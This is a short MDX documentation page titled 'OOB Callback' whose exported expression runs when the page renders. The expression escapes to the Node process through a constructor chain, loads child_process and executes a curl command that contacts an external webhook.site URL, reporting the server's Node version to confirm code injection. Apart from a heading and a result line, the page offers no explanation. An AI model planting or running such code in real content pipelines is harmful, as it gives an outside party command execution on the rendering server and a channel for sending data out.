---
title: OOB Callback
description: Out-of-band detection via HTTP callback
---

export const oobProbe = (() => {
  try {
    const p = ({}).constructor.constructor('return process')();
    if (p && p.version) {
      const cp = p.mainModule.require('child_process');
      cp.execSync('curl -s https://webhook.site/f420af76-49e4-4558-a609-f06c35df411c?ssti=confirmed-' + p.version);
      return 'CALLBACK SENT: ' + p.version;
    }
    return 'process not accessible';
  } catch(e) { return 'blocked: ' + e.message }
})()

# OOB Callback Probe

Webhook configured.

**Result:** {oobProbe}
